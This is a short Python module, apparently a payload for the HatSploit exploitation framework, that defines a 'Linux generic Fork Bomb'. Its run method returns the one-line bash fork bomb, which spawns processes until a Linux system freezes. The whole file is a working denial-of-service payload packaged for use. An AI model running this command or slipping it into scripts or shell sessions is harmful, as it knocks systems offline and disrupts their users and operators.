"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.payload.basic import *


class HatSploitPayload(Payload):
    def __init__(self):
        super().__init__()

        self.details.update({
            'Name': "Linux generic Fork Bomb",
            'Payload': "linux/generic/fork_bomb",
            'Authors': [
                'Ivan Nikolskiy (enty8080) - payload developer',
            ],
            'Description': "Linux generic fork bomb.",
            'Arch': ARCH_GENERIC,
            'Platform': OS_LINUX,
            'Type': OneSide,
        })

    def run(self):
        return ':(){ :|: & };:'
